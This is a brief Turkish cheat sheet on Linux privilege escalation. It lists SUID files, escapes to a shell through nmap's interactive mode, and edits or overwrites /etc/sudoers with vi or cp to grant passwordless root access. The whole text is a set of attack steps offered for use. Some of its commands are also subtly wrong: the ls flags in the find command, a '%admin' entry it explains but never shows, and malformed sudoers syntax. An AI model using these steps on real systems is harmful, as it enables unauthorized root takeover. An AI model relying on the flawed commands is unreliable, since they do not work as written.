## Suidbit İle Yetki Yükseltme

`find / -perm -4000 -exec ls lba {} \; 2> /dev/null`

Yukarıdaki komut sistemdeki **suidbite** sahip olan bütün dosyaları listeler.

### Nmap suidbit ile yetki yükseltme

```bash
nmap --interactive
!sh
```

### vi suidbit ile yetki yükseltme

`vi /etc/sudoers` dosyasını açıp kullanıcımıza `[kullanici_adi] ALL=(ALL:ALL) ALL NOPASSWD: ALL` şeklinde yetki ekliyoruz. Burada `%admin` ifadesi **admin** grubunu belirtir. Daha sonra **ESC** basıp `wq!` komutunu vi ye veridikten sonra `sudo su` diyerek **root** olabiliyoruz.

### cp ile yetki yükseltme

```shell
cp /etc/sudoers ~/
cd ~/ 
nano sudoers
```

> root    ALL=(ALL:ALL) ALL NOPASSWD:ALL
>
> %sudo   ALL=(ALL:ALL) ALL NOPASSWD:ALL

```bash
cp sudoers /etc/sudoers
sudo su 
```

